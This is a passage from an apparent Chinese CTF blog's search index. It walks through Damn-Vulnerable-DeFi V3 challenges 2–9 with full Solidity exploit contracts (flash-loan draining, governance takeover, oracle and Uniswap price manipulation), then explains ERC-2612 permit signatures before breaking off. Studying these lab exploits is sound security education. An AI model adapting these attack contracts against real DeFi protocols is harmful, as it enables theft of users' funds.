题解","uri":"/damn-vulnerable-defi/#题解"},{"categories":["CTF"],"content":" Challenge 2 - Naive receiver","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:2:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-2---naive-receiver"},{"categories":["CTF"],"content":" 合约 NaiveReceiverLenderPool：继承IERC3156FlashLender，提供闪电贷功能 FlashLoanReceiver：继承IERC3156FlashBorrower，用于发起闪电贷接收回调 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:2:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-1"},{"categories":["CTF"],"content":" 脚本 部署NaiveReceiverLenderPool合约，向pool中转入1000eth，pool的闪电贷手续费为1eth 部署FlashLoanReceiver合约，向receiver中转入10eth 执行攻击脚本 期望receiver中的余额为0，pool中的余额为1000+10eth ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:2:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#脚本-1"},{"categories":["CTF"],"content":" 题解攻击目标是使得receiver中的余额为空，因为每次通过pool执行闪电贷都需要1eth的手续费，因此只需通过receiver向pool执行十次闪电贷即可把10eth全部通过手续费的方式转给pool 根据题目要求，尽量在一笔交易完成，因此可以编写合约在一笔交易中完成十次闪电贷 solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"../../src/naive-receiver/FlashLoanReceiver.sol\"; import \"../../src/naive-receiver/NaiveReceiverLenderPool.sol\"; import \"openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol\"; contract Attacker { constructor(address payable _pool, address payable _receiver){ NaiveReceiverLenderPool pool = NaiveReceiverLenderPool(_pool); for(uint256 i=0; i\u003c10; i++){ pool.flashLoan(IERC3156FlashBorrower(_receiver), address(0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE), 1, \"0x\"); } } } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:2:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-1"},{"categories":["CTF"],"content":" Challenge 3 - TrusterTruster ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:3:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-3---truster"},{"categories":["CTF"],"content":" 合约 TrusterLenderPool：提供闪电贷功能，池子中有100w DVT tokens ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:3:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-2"},{"categories":["CTF"],"content":" 脚本 部署DamnValuableToken、TrusterLenderPool合约 向pool中转入100w DVT tokens 执行攻击脚本 期望100w token全部归属player账户，pool余额清空 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:3:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#脚本-2"},{"categories":["CTF"],"content":" 题解在pool中的flashLoan方法中，首先需要计算当前的token余额balanceBefore，然后转移token到borrower，再执行给定target.functionCall，最后校验当前余额和balanceBefore 区别于之前的闪电贷，这里pool没有继承IERC3156FlashLender，而是通过调用传入的target和calldata完成回调功能 因此主要的攻击方向就是target.functionCall，包括的内容是： 将指定amount的token approve给攻击合约 执行repay流程 执行完functionCall后再利用transfer方法将token从pool中转移出来，整体流程图如下所示： 根据题目要求，尽可能在一笔交易完成，那么需要写合约来完成flashloan+approve+transfer的操作 包括两个合约：TmpAttacker和Attacker，执行flashloan的是Attacker，但是因为一笔交易内完成（只有部署合约），部署合约时无法拿到当前合约地址，需要再创建一个合约：TmpAttacker 部署Attacker合约时会调用pool.flashLoan，此时amount为0，只是为了进行approve，将TOKENS_IN_POOL数目的token approve给TmpAttacker 再调用TmpAttacker.withdraw将token转移到player账户，完成攻击 整体代码如下： solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"../../src/truster/TrusterLenderPool.sol\"; import \"../../src/DamnValuableToken.sol\"; contract TmpAttacker { uint256 internal constant TOKENS_IN_POOL = 1_000_000e18; address player; address pool; DamnValuableToken token; constructor(address _player,address _token, address _pool){ player = _player; pool = _pool; token = DamnValuableToken(_token); } function withdraw() external{ token.transferFrom(pool, player, TOKENS_IN_POOL); } } contract Attacker { uint256 internal constant TOKENS_IN_POOL = 1_000_000e18; constructor(address _pool, address _token){ TmpAttacker attacker = new TmpAttacker(msg.sender, _token,_pool); TrusterLenderPool pool = TrusterLenderPool(_pool); bytes memory data = abi.encodeWithSignature( \"approve(address,uint256)\", attacker, TOKENS_IN_POOL ); pool.flashLoan(0, address(attacker), _token, data); attacker.withdraw(); } } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:3:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-2"},{"categories":["CTF"],"content":" Challenge 4 - The Rewarder","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:4:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-4---the-rewarder"},{"categories":["CTF"],"content":" 合约本题涉及的合约比较多，首先介绍ERC20Snapshot合约 ERC20Snapshot：继承自ERC20，通过SnapshotId可以追溯到每一个快照时间点的账户余额和总供应量，在ERC20 token的transfer之前会通过beforeTransfer来更新当前快照ID下的账号余额和总供应，通常用作分红、投票、空投等快照场景 这道题目中主要由RewardToken、AccountingToken、LiquidityToken和TheRewarderPool组成，它们的关系如下： TheRewarderPool对外提供deposit和withdraw方法 deposit：用户存入liquidityToken，mint对应份额的AccountingToken，根据当前的快照轮次mint出一定数目的rewardToken，每5天一个新的快照轮次 withdraw：burn对应份额的AccountingToken，将用户存入的liquidityToken转移给用户 除此之外，本题还提供一个闪电贷合约，可用于通过闪电贷借出liquidityToken ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:4:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-3"},{"categories":["CTF"],"content":" 测试 创建alice bob charlie david四名用户，记录为users 部署LiquidityToken FlashLoanerPool 合约，向FlashLoanerPool中转入liquidityToken 数目为：TOKENS_IN_LENDER_POOL 部署 TheRewarderPool （连带部署RewardToken AccountingToken） 遍历users数组，向每个用户都转入一定数目的liquidityToken，并deposit到TheRewarderPool，此时轮次为1 将区块时间戳向后延长5天，再次遍历user数组，依次触发distributeRewards，每个用户都等分到rewardToken，此时轮次为2 执行攻击脚本 期望当前轮次为3，遍历users数组，触发distributeRewards，每个用户分到的rewardToken少于原来的1/4 期望player的rewardToken余额大于0 期望player的liquidityToken数目为0，FlashLoanerPool中的liquidityToken数目不变 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:4:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#测试"},{"categories":["CTF"],"content":" 题解假设没有任何额外的用户操作，在下一轮次分配奖励的时候，users数组中的四位用户将会继续评分奖励，每个用户分到的rewardToken为总数的1/4 为了达到测试脚本的期望值，需要player参与rewardToken的分配，可以通过闪电贷借出liquidityToken，deposit到TheRewarderPool，此时可以触发新一轮的rewardToken分配，再通过withdraw赎回liquidityToken并返还给FlashLoanerPool 攻击合约代码如下： solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import {TheRewarderPool, RewardToken} from \"../../src/the-rewarder/TheRewarderPool.sol\"; import \"../../src/the-rewarder/FlashLoanerPool.sol\"; import \"../../src/DamnValuableToken.sol\"; contract Attacker { FlashLoanerPool flashloan; TheRewarderPool pool; DamnValuableToken dvt; RewardToken reward; address internal owner; constructor(address _flashloan,address _pool,address _dvt,address _reward){ flashloan = FlashLoanerPool(_flashloan); pool = TheRewarderPool(_pool); dvt = DamnValuableToken(_dvt); reward = RewardToken(_reward); owner = msg.sender; } function attack(uint256 amount) external { flashloan.flashLoan(amount); } function receiveFlashLoan(uint256 amount) external{ dvt.approve(address(pool), amount); // deposit liquidity token get reward token pool.deposit(amount); // withdraw liquidity token pool.withdraw(amount); // repay to flashloan dvt.transfer(address(flashloan), amount); reward.transfer(owner, reward.balanceOf(address(this))); } } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:4:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-3"},{"categories":["CTF"],"content":" Challenge 5 - Side Entrance","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:5:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-5---side-entrance"},{"categories":["CTF"],"content":" 合约 SideEntranceLenderPool：提供deposit和withdraw方法，支持闪电贷 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:5:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-4"},{"categories":["CTF"],"content":" 脚本 部署SideEntranceLenderPool合约 向pool中deposit eth数目ETHER_IN_POOL 执行攻击脚本 期望pool中的余额为0，player余额大于ETHER_IN_POOL ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:5:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#脚本-3"},{"categories":["CTF"],"content":" 题解本题的攻克点在于deposit+withdraw，可以先通过闪电贷获得eth，再调用deposit获得凭证，再结束闪电贷后通过withdraw提取出eth，整体流程图如下所示： 调用pool的flashLoan方法时会调用IFlashLoanEtherReceiver(msg.sender).execute{value: amount}(); 因此在攻击合约中需要实现execute 方法，做的工作就是进行deposit，从而完成闪电贷还款，还多记录了一份存款凭证 player再通过调用withdraw方法从pool中取出对应的eth，全部转移到player，完成攻击 合约代码如下： solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"../../src/side-entrance/SideEntranceLenderPool.sol\"; contract Attacker { SideEntranceLenderPool pool; address owner; constructor(address _pool){ pool = SideEntranceLenderPool(_pool); owner = msg.sender; } receive() external payable { payable(owner).transfer(msg.value); } function attack(uint256 amount) external payable{ pool.flashLoan(amount); } function execute() external payable{ uint256 value = msg.value; // deposit pool.deposit{value: value}(); } function withdraw() external{ pool.withdraw(); } } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:5:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-4"},{"categories":["CTF"],"content":" Challenge 6 - Selfie","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:6:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-6---selfie"},{"categories":["CTF"],"content":" 合约 SimpleGovernance：治理代币合约，实现ISimpleGovernance接口，可以预先设置action，在两天后可以执行此action SelfiePool：实现IERC3156FlashLender，提供闪电贷，包括ERC20Snapshot和SimpleGovernance两种token ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:6:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-5"},{"categories":["CTF"],"content":" 测试 部署DamnValuableTokenSnapshot，SimpleGovernance合约 部署SelfiePool合约，向pool中转入token，数目为TOKENS_IN_POOL 对token执行一次快照，当前pool中余额和最大供闪电贷额度均为TOKENS_IN_POOL 执行攻击脚本 期望player账户token余额为TOKENS_IN_POOL，pool账户token余额为0 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:6:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#测试-1"},{"categories":["CTF"],"content":" 题解本题的目的就是取走pool中的全部token，在pool合约中有emergencyExit 函数 可以看到，只要满足onlyGovernance 条件，即可转走当前合约内的任意数目token solidity function emergencyExit(address receiver) external onlyGovernance { uint256 amount = token.balanceOf(address(this)); token.transfer(receiver, amount); emit FundsDrained(receiver, amount); } onlyGovernance 要求调用方必须是SimpleGovernance合约，我们又知道在SimpleGovernance 合约中提供了设置action和执行action的方法，在设置action的参数中就包括了target和calldata这样的合约调用参数 因此完整的调用流程如下所示： 首先通过调用攻击合约，实施闪电贷获得goveranceToken，再去SimpleGoverance中记录一个action，填入的目标方法就是调用pool的emergencyExit 待两天后，通过主动执行action来转移出pool的全部token 代码如下： solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; import {SelfiePool, SimpleGovernance, DamnValuableTokenSnapshot} from \"../../src/selfie/SelfiePool.sol\"; import \"openzeppelin-contracts/contracts/interfaces/IERC3156FlashBorrower.sol\"; contract SelfiePoolAttacker is IERC3156FlashBorrower{ SelfiePool pool; SimpleGovernance governance; DamnValuableTokenSnapshot token; address owner; uint256 actionId; constructor(address _pool, address _governance, address _token){ owner = msg.sender; pool = SelfiePool(_pool); governance = SimpleGovernance(_governance); token = DamnValuableTokenSnapshot(_token); } function attack(uint256 amount) public { // call flashloan pool.flashLoan(IERC3156FlashBorrower(this), address(token), amount, \"0x\"); } function onFlashLoan( address initiator, address _token, uint256 amount, uint256 fee, bytes calldata data ) external returns (bytes32){ // queue action token.snapshot(); actionId = governance.queueAction(address(pool), 0, abi.encodeWithSignature(\"emergencyExit(address)\", owner)); token.approve(address(pool), amount); return keccak256(\"ERC3156FlashBorrower.onFlashLoan\"); } function executeAction() public{ governance.executeAction(actionId); } } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:6:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-5"},{"categories":["CTF"],"content":" Challenge 7 - Compromised","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:7:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-7---compromised"},{"categories":["CTF"],"content":" 合约 Exchange: 提供购买（mint）和售卖(burn) DamnValuableNFT的方法，对应的价格由预言机提供 TrustfulOracle: 可信价格预言机合约，维护着由几个可信的账号设定的nft价格，对外提供查询nft价格中位数的方法 TrustfulOracleInitializer：用于部署TrustfulOracle合约并初始化nft价格 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:7:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-6"},{"categories":["CTF"],"content":" 测试 部署TrustfulOracleInitializer合约，顺带完成TrustfulOracle合约的部署，设置初始nft价格为INITIAL_NFT_PRICE 部署Exchange合约，顺带完成DamnValuableNFT合约的部署，存入EXCHANGE_INITIAL_ETH_BALANCE 执行攻击脚本 期望Exchange合约中的余额为0，player余额为EXCHANGE_INITIAL_ETH_BALANCE，player不拥有nft，oracle中的nft价格中位数为INITIAL_NFT_PRICE ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:7:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#测试-2"},{"categories":["CTF"],"content":" 题解通过阅读Exchange合约可以发现 buyOne 和 sellOne 所需要付的和收回的eth都是由oracle提供的，通过 oracle.getMedianPrice() 方法获得nft的价格 攻击的目标是获取Exchange合约中的全部eth，则可以通过低买高卖nft的方式来赚取EXCHANGE_INITIAL_ETH_BALANCE数额的eth，因此最终目标来到了操纵预言机，通过分析oracle的获取nft价格中位数的方法可以得知，只需要操纵过半的预言机就可以达到修改价格的目的 solidity function _computeMedianPrice(string memory symbol) private view returns (uint256) { uint256[] memory prices = getAllPricesForSymbol(symbol); LibSort.insertionSort(prices); if (prices.length % 2 == 0) { uint256 leftPrice = prices[(prices.length / 2) - 1]; uint256 rightPrice = prices[prices.length / 2]; return (leftPrice + rightPrice) / 2; } else { return prices[prices.length / 2]; } } 题目中给了一段捕获到的http报文信息，合理推测这两段字符串就是对应其中两个预言机的私钥，将16进制数转成ASCII码，再通过base64解码，最终得到两个私钥 完整的流程图如下所示： 首先通过操纵预言机降低nft单价让player购买，再操纵预言机将nft价格提升让player卖出即完成攻击，代码如下： solidity function testExploit() public{ /*Code solution here*/ oracle1 = vm.addr(0xc678ef1aa456da65c6fc5861d44892cdfac0c6c8c2560bf0c9fbcdae2f4735a9); oracle2 = vm.addr(0x208242c40acdfa9ed889e685c23547acbed9befc60371e9875fbcd736340bb48); postPrice(0.0001 ether); vm.startPrank(player); uint256 id = exchange.buyOne{value: 0.0001 ether}(); vm.stopPrank(); uint256 exchangeBalance = address(exchange).balance; postPrice(exchangeBalance); vm.startPrank(player); nftToken.approve(address(exchange), id); exchange.sellOne(id); vm.stopPrank(); postPrice(INITIAL_NFT_PRICE); validation(); } function postPrice(uint256 price) public{ vm.startPrank(oracle1); oracle.postPrice('DVNFT', price); vm.stopPrank(); vm.startPrank(oracle2); oracle.postPrice('DVNFT', price); vm.stopPrank(); } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:7:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-6"},{"categories":["CTF"],"content":" Challenge 8 - Puppet","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:8:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-8---puppet"},{"categories":["CTF"],"content":" 合约 PuppetPool：提供borrow方法，供用户使用eth购买token，token的价格来自于uniswap ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:8:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-7"},{"categories":["CTF"],"content":" 测试 部署DamnValuableToken合约，部署UniswapV1Factory UniswapV1Exchange合约，完成exchange的初始化 部署PuppetPool合约，传入DamnValuableToken和UniswapV1Exchange合约 向UniswapV1Exchange中提供token与eth 1:1 的流动性 设置player和pool合约的token余额分别为PLAYER_INITIAL_TOKEN_BALANCE和POOL_INITIAL_TOKEN_BALANCE 执行测试脚本 期望player的nonce为1，pool中的token余额为0，player中的token余额大于POOL_INITIAL_TOKEN_BALANCE ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:8:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#测试-3"},{"categories":["CTF"],"content":" 题解这道题的解题思路和上题类似，在pool提供了borrow方法中使用了uniswap作为token的价格预言机，那么我们的攻击思路就是通过操纵uniswap中token的价格以在pool中低价买入token 本题提供的是uniswap v1合约，且题目只给了合约的abi和bytecode，首先整理下uniswap v1的接口及我们需要用到的方法 solidity // 计算卖出token能换出多少eth function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256); // 计算买入token需要多少eth function ethToTokenSwapOutput(uint256 tokens_bought, uint256 deadline) external returns (uint256); 完整的攻击流程如下图所示： 第一步通过调用tokenToEthSwapInput 以卖出手中的token获得eth，从而降低在uniswap中的token价格 第二步在token价格降低后，调用lendingPool.borrow 方法，以低价买入token 第三步再通过调用ethToTokenSwapOutput ，用手中的eth买入token来恢复uniswap中的token价格 通过将这三步在一笔交易内完成，player可以获取lendingPool中的全部token从而实现攻击目标 在具体实现时，值得注意的是授权步骤，因为题目要求在一笔交易内完成，但是使用uniswap又需要approve，因此涉及从player到攻击合约到uniswap的三级approve，在一笔交易内是无法实现的。 但通过看DamnValuableToken 的实现代码，可以看到它实现的ERC20协议中包括了拓展的EIP- 2612 LOGIC ，包含的就是permit逻辑，即通过用户在链下预签名，再提供到链上进行验证，从而实现了代理approve的机制，具体关于ERC-2612可以看另一篇文章的介绍 完整的合约代码如下： solidity // SPDX-License-Identifier: MIT pragma solidity ^0.8.0; import \"../../src/puppet/PuppetPool.sol\"; import \"../../src/DamnValuableToken.sol\"; contract Attacker { DamnValuableToken token; PuppetPool pool; receive() external payable{} // receive eth from uniswap constructor(uint8 v, bytes32 r, bytes32 s, uint256 playerAmount, uint256 poolAmount, address _pool, address _uniswapPair, address _token) payable{ pool = PuppetPool(_pool); token = DamnValuableToken(_token); prepareAttack(v, r, s, playerAmount, _uniswapPair); // swap token for eth --\u003e lower token price in uniswap _uniswapPair.call(abi.encodeWithSignature( \"tokenToEthSwapInput(uint256,uint256,uint256)\", playerAmount, 1, type(uint256).max )); // borrow token from puppt pool uint256 ethValue = pool.calculateDepositRequired(poolAmount); pool.borrow{value: ethValue}( poolAmount, msg.sender ); // repay tokens to uniswap --\u003e recovery balance in uniswap _uniswapPair.call{value: 10 ether}( abi.encodeWithSignature( \"ethToTokenSwapOutput(uint256,uint256)\", playerAmount, type(uint256).max ) ); token.transfer(msg.sender, token.balanceOf(address(this))); payable(msg.sender).transfer(address(this).balance); } function prepareAttack(uint8 v, bytes32 r, bytes32 s, uint256 amount, address _uniswapPair) internal { // tranfser player token to attacker contract token.permit(msg.sender, address(this), type(uint256).max, type(uint256).max, v,r,s); token.transferFrom(msg.sender, address(this), amount); token.approve(_uniswapPair, amount); } } ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:8:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-7"},{"categories":["CTF"],"content":" Challenge 9 - Puppet V2","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:9:0","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#challenge-9---puppet-v2"},{"categories":["CTF"],"content":" 合约 PuppetV2Pool: 提供borrow方法，用weth换出token，token价格来自于uniswap的报价 Uniswap-v2相关合约 ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:9:1","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#合约-8"},{"categories":["CTF"],"content":" 测试 部署weth和token合约 部署uniswap factory、router、pair合约 通过与router合约交互注入流动性，token数目：UNISWAP_INITIAL_TOKEN_RESERVE，eth数目：UNISWAP_INITIAL_WETH_RESERVE 部署puppetV2Pool合约，向player和pool中分别转入PLAYER_INITIAL_TOKEN_BALANCE和POOL_INITIAL_TOKEN_BALANCE数目的token 执行测试脚本 期望pool中的token余额为0，player的token余额大于POOL_INITIAL_TOKEN_BALANCE ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:9:2","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#测试-4"},{"categories":["CTF"],"content":" 题解这道题的攻击思路和Puppet- v1的思路类似，仍然是利用uniswap价格预言机对pool进行攻击， 值得注意的是这里使用的都是uniswap-v2，在v2中使用的是token和weth的代币对，但是player用户开始只有eth，需要与weth合约进行交互 完整的攻击流程如下图所示： 第一步：通过调用swapExactTokensForTokens 将player账户中的全部token换成weth，从而降低token在uniswap中的单价 第二步：计算借出池子中的全部token需要花费多少weth，在经过第一步后已经拿到一部分weth，再通过质押eth补齐剩余的weth 第三步：调用池子的borrow 方法，将pool中的全部token借出 第四步：（本题未做要求，可以将weth放入池子中，补足池子中的差价） 完整的步骤代码示例如下： solidity token.approve(address(uniswapV2Router), PLAYER_INITIAL_TOKEN_BALANCE); address[] memory path = new address[](2); path[0] = address(token); path[1] = address(weth); // swap token to weth uniswapV2Router.swapExactTokensForTokens( PLAYER_INITIAL_TOKEN_BALANCE, // amount in 1, // amount out min path, // path address(player), // to block.timestamp*2 // deadline ); uint256 value = pool.calculateDepositOfWETHRequired(POOL_INITIAL_TOKEN_BALANCE); uint256 depositValue = value - weth.balanceOf(address(player)); weth.deposit{value: depositValue}(); weth.approve(address(pool), value); pool.borrow(POOL_INITIAL_TOKEN_BALANCE); ","date":"2023-08-01","objectID":"/damn-vulnerable-defi/:9:3","series":null,"tags":null,"title":"Damn-Vulnerable-Defi V3 题解","uri":"/damn-vulnerable-defi/#题解-8"},{"categories":["system design"],"content":" 什么是ERC-2612ERC-2612: Permit Extension for EIP-20 Signed Approvals ERC-2612是针对erc20中的approve的优化，传统的approve必须由EOA发起，对于EOA来说approve+后续操作就是至少两笔交易，有一些额外的gas开销。erc2612是对erc20的拓展，引入新的方法来实现approve erc-2612需要实现三个新方法： solidity function permit(address owner, address spender, uint value, uint deadline, uint8 v, bytes32 r, bytes32 s) external function nonces(address owner) external view returns (uint) function DOMAIN_SEPARATOR() external view returns (bytes32) 重点就是permit方法，这个方法同样也会修改erc20中的approval结构，释放event permit方法需要传入7个参数： owner：当前token的owner spender：授权人 value：approve的额度 deadline：交易执行的截止日期 v：交易签名数据 r：交易签名数据 s：交易签名数据 solidity function permit( address owner, address spender, uint256 value, uint256 deadline, uint8 v, bytes32 r, bytes32 s ) public virtual { require(deadline \u003e= block.timestamp, \"PERMIT_DEADLINE_EXPIRED\"); // Unchecked because the only math done is incrementing // the owner's nonce which cannot realistically overflow. unchecked { address recoveredAddress = ecrecover( keccak256( abi.encodePacked( \"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256( abi.encode( keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" ), owner, spender, value, nonces[owner]++, deadline ) ) ) ), v, r, s ); require(recoveredAddress != address(0) \u0026\u0026 recoveredAddress == owner, \"INVALID_SIGNER\"); allowance[recoveredAddress][spender] = value; } emit Approval(owner, spender, value); } ","date":"2023-08-01","objectID":"/erc2612/:1:0","series":null,"tags":null,"title":"ERC2612 Approve的拓展","uri":"/erc2612/#什么是erc-2612"},{"categories":["system design"],"content":" ERC-2612的使用流程","date":"2023-08-01","objectID":"/erc2612/:2:0","series":null,"tags":null,"title":"ERC2612 Approve的拓展","uri":"/erc2612/#erc-2612的使用流程"},{"categories":["system design"],"content":" permitpermit的主要流程包括： 校验当前的交易deadline 通过ecrecover解析出recoveredAddress地址 校验recoveredAddress是否与传入的owner地址一致 执行approve逻辑，修改allowance并释放Approval事件 重要的流程就是第二步，根据传入的参数解析出recoveredAddress，并校验与传入的owner一致，再执行类似：token.approve(spender, value) 的逻辑完成approve 首先通过uncheck 包装内部的逻辑，使用uncheck有几个用处： 解决solidity 0.8.0之后针对溢出默认revert与之前代码冲突的问题，比如我能确保自己的这段运算不会溢出，就可以在外面用uncheck包装，不让solidity来默认帮我做溢出的判断，这会引入额外的gas开销 在0.8.0之后不再需要safemath 其次又用了一个关键词ecrecover 这个方法的输入参数是： bytes32：签名后的消息 uint8: v bytes32: r bytes32: s 返回的参数是签名的地址recoveredAddress 因为rvs都是传入的参数，继续看签名的消息是啥 solidity keccak256( abi.encodePacked( \"\\x19\\x01\", DOMAIN_SEPARATOR(), keccak256( abi.encode( keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" ), owner, spender, value, nonces[owner]++, deadline ) ) ) ) keccak256 是在solidity中用来计算hash的内置方法， abi.encodePacked 是对传入的参数进行紧密的编码（省去0的填充，节省空间不与合约交互时使用） ","date":"2023-08-01","objectID":"/erc2612/:2:1","series":null,"tags":null,"title":"ERC2612 Approve的拓展","uri":"/erc2612/#permit"},{"categories":["system design"],"content":" DOMAIN_SEPARATOR其中还有一个方法:DOMAIN_SEPARATOR() 这也是erc-2612中需要实现的方法，这个字段的目的是把每个链上的每个合约都做唯一性标识，并满足EIP-712的要求（一个标准的结构化签名协议，保证链下签名，链上校验的安全性，其中的domain separator是一个唯一标识符防止重放攻击） EIP-712 solidity function DOMAIN_SEPARATOR() public view virtual returns (bytes32) { return block.chainid == INITIAL_CHAIN_ID ? INITIAL_DOMAIN_SEPARATOR : computeDomainSeparator(); } function computeDomainSeparator() internal view virtual returns (bytes32) { return keccak256( abi.encode( keccak256(\"EIP712Domain(string name,string version,uint256 chainId,address verifyingContract)\"), keccak256(bytes(name)), keccak256(\"1\"), block.chainid, address(this) ) ); } 这个示例的DOMAIN_SEPARATOR() 方法使用keccak256对合约名称，chainID，版本号，当前合约地址等信息进行哈希计算得出的唯一标识 结束计算DOMAIN_SEPARATOR后，又通过abi.encode对这一段进行编码： solidity abi.encode( keccak256( \"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\" ), owner, spender, value, nonces[owner]++, deadline ) 这里的参数都是permit传入的，需要注意的是nonce 这个字段，使用的是nonces[owner]++ ，通过自定义的数组来维护自增的用户nonce，避免用户同一笔签名的交易被重复利用 由此流程，便从哈希后的签名信息中解析出了recoveredAddress地址，那么为什么解析出的recoveredAddress地址就和owner一定一致呢？ ","date":"2023-08-01","objectID":"/erc2612/:2:2","series":null,"tags":null,"title":"ERC2612 Approve的拓展","uri":"/erc2612/#domain_separator"},{"categories":["system design"],"content":" 如何使用ERC-2612前面提到，通过调用permit方法即可完成approve的代理调用，省去EOA前置approve的操作，在调用permit时有非常重要的三个参数r s v，那么这三个参数是需要EOA前置签名好提供过来的 通过forge的下面一段代码为例： solidity address alice = vm.addr(1); bytes32 hash = keccak256(\"Signed by Alice\"); (uint8 v, bytes32 r, bytes32 s) = vm.sign(1, hash); address signer = ecrecover(hash, v, r, s); assertEq(alice, signer); // [PASS] alice对hash进行签名，即返回vrs三个参数，再通过ecrecover即得到signer即为alice 那么为了通过permit中的校验逻辑，我们也需要构造一致的签名内容让EOA完成签名，我们再拿着rsv去调用permit即可 下面一段代码就是对permit签名方法的封装，定义了Permit结构，与erc-2612中的计算方式一致 solidity // SPDX-License-Identifier: UNLICENSED pragma solidity ^0.8.13; contract SigUtils { bytes32 internal DOMAIN_SEPARATOR; constructor(bytes32 _DOMAIN_SEPARATOR) { DOMAIN_SEPARATOR = _DOMAIN_SEPARATOR; } // keccak256(\"Permit(address owner,address spender,uint256 value,uint256 nonce,uint256 deadline)\"); bytes32 public constant PERMIT_TYPEHASH = 